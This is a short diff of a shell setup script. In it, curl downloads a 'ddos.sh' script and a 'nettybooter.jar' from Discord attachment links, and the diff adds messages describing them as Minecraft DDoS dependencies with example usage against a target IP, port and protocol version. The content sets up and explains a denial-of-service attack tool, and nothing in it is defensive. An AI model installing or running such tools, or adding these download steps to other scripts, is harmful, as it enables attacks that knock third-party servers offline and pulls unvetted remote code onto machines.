@@ -181,12 +181,14 @@ echo "--------------"
 
 if ! [ -f $HOMEddos.sh ];
 then
-echo "Installing deps"
+echo "--------------"
+echo "Installing deps for mc ddos"
 curl -o $HOME/ddos.sh https://cdn.discordapp.com/attachments/920543974266130523/929337717588885514/ddos.sh
-echo "|\===============>|50%"
+echo "|===============>|100%"
 curl -o $HOME/nettybooter.jar https://cdn.discordapp.com/attachments/920543974266130523/929309799110307900/nettybooter.jar
-echo "Deps installed"
-echo "For help enter: sh ddos.sh"
+echo "Example usage: sh ddos.sh IP:PORT PROTOCOL (For 1.12.2 = 340)"
+echo ""
+echo "--------------"
 fi
 if ! [ -f $HOME/startcustom.sh ];
 then
